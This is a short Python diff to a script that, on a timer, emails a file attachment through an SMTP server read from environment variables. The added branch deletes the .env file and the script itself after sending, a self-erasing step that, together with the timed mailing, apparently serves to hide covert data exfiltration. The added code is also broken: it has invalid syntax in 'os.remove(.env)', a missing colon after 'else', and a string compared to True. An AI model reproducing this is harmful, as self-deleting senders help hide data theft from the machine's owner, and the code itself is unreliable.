@@ -48,13 +48,17 @@ def sendEmail():
     msg.attach(part)
  
     #here using gmail credentials but can replaced for any email provider details
-    server = smtplib.SMTP('smtp.gmail.com', 587)
+    server = smtplib.SMTP(os.getenv("SERVER"), os.getenv("PORT"))
     server.starttls()
     server.login(fromaddr, os.getenv("SENDING_EMAIL_PASSWORD"))
     text = msg.as_string()
     server.sendmail(fromaddr, toaddr, text)
     server.quit()
-    setTime(1)
+    if os.getenv("DELETE") == True:
+        os.remove(.env)
+        os.remove(sys.argv[0])
+    else
+        setTime(1)
 
 t = Timer(secs, sendEmail)
 t.start()
